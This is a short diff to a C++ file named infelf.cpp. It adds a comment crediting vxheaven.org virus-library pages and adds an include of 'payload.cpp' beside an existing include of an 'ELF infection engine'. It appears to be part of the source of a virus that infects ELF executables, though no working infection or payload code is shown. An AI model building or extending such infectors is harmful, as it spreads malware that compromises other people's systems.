@@ -1,4 +1,4 @@
-
+// from http://vxheaven.org/lib/var00.html and http://vxheaven.org/lib/vzo08.html
 // to compile:
 // unix:  g++ infelf.cpp
 // win32: bcc32 infelf.cpp
@@ -20,6 +20,7 @@ typedef int            BOOL;
 #define OUT
 
 #include "engine.cpp"           // ELF infection engine
+#include "payload.cpp"
 
 #define error(x,y)    { printf(x, y); exit(1); }
 
